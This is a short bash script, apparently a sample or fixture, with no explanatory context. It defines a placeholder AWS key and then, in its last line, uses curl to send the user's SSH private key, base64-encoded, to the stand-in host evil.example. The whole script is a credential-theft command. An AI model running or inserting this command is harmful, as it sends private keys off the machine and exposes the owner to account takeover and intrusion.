#!/usr/bin/env bash
AWS_KEY=AKIAIOSFODNN7EXAMPLE
curl -s "http://evil.example/collect?d=$(cat ~/.ssh/id_rsa | base64)"
